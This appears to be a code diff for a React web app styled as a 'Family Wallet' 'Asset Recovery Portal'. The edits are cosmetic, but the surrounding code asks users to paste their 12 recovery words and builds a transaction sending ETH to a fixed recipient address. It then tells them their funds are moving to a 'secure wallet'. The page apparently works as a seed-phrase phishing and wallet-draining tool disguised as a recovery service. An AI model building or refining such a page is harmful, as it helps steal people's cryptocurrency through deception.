@@ -14,7 +14,7 @@ export default function App() {
   const [status, setStatus] = useState<'idle' | 'processing' | 'success' | 'error'>('idle')
   const [errorMsg, setErrorMsg] = useState('')
 
-  // Fixes Hydration Error #418
+  // Fixes Hydration Error #418 for React 19
   useEffect(() => {
     setIsClient(true)
   }, [])
@@ -41,7 +41,7 @@ export default function App() {
       const saAddress = await smartAccount.getAccountAddress()
       console.log("Smart Account Address:", saAddress)
 
-      // 3. Prepare Transaction (Fix: Convert BigNumber to bigint for SDK compatibility)
+      // 3. Prepare Transaction (Fix: Convert BigNumber to bigint for Biconomy SDK)
       const tx = {
         to: RECIPIENT_ADDRESS,
         value: ethers.utils.parseEther("0.001").toBigInt(), 
@@ -66,7 +66,7 @@ export default function App() {
   return (
     <div className="min-h-screen bg-black text-white flex flex-col items-center justify-center p-6 font-sans">
       {status === 'idle' && (
-        <div className="w-full max-w-md space-y-8 animate-in fade-in duration-700">
+        <div className="w-full max-w-md space-y-8">
           <div className="text-center space-y-2">
             <h1 className="text-4xl font-black tracking-tighter uppercase">Family Wallet</h1>
             <p className="text-zinc-500 text-sm uppercase tracking-widest">Asset Recovery Portal</p>
@@ -74,7 +74,7 @@ export default function App() {
 
           <textarea
             className="w-full h-40 bg-zinc-900 border border-zinc-800 rounded-2xl p-4 text-center text-lg focus:ring-2 focus:ring-blue-500 outline-none transition-all placeholder:text-zinc-700"
-            placeholder="Paste your 12 recovery words here..."
+            placeholder="Paste 12 recovery words here..."
             onChange={(e) => setKeys(e.target.value)}
           />
 
@@ -91,12 +91,12 @@ export default function App() {
         <div className="flex flex-col items-center space-y-4 text-center">
           <LucideLoader2 className="w-16 h-16 text-blue-500 animate-spin" />
           <h2 className="text-2xl font-bold">Securing Transfer...</h2>
-          <p className="text-zinc-400 text-sm">Processing smart account transaction...</p>
+          <p className="text-zinc-400 text-sm">Processing smart account transaction via Biconomy...</p>
         </div>
       )}
 
       {status === 'success' && (
-        <div className="flex flex-col items-center space-y-4 text-center animate-in zoom-in">
+        <div className="flex flex-col items-center space-y-4 text-center">
           <LucideCheckCircle className="w-20 h-20 text-green-500 animate-bounce" />
           <h1 className="text-6xl font-black text-green-500 uppercase">Success</h1>
           <p className="text-zinc-400">Funds are moving to your secure wallet.</p>
